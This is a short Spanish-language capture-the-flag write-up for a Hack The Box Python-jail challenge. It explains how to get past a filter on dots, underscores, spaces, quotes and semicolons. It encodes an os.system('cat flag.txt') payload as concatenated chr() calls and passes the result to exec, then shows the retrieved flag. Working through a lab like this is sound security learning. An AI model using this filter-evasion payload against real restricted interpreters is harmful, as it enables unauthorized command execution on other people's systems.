# Nehebakaus trap

Este reto tiene una instancia remota a la uno puede conectarse y por los errores que aparecen podemos concluir que se trata de una terminal en python.

Antes de ejecutar un payload como por ejemplo `print(__import__('os').system('cat flag.txt'))`, hay varias restricciones a ciertos caracteres como lo son el punto `.`, el guión al piso `_`, el espacio ` `, las comillas sencillas `'`, las comillas dobles `"` y el punto y coma `;`.

Teniendo en cuenta lo anterior, podriamos ejecutar una cadena dentro de una función `eval` o `exec`. Dicha cadena se contruiría con la función `chr()` que transforma un número en su equivalente ascii

```python
>>> chr(65)
'A'
```

Concatenaríamos carácter por carácter con la suma `+` que no esta restringido. Entonces utilicemos el payload y lo transformamos en funciones `chr` concatenadas

```python
inp = "print(__import__('os').system('cat flag.txt'))"

for c in inp:
    print("chr("+str(ord(c))+")+", end='')
```

Finalmente obtenemos la bandera

 ```python
 exec(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(41)+chr(41))
HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}

[*] Input accepted!

0
 ```
 
 flag `HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}`
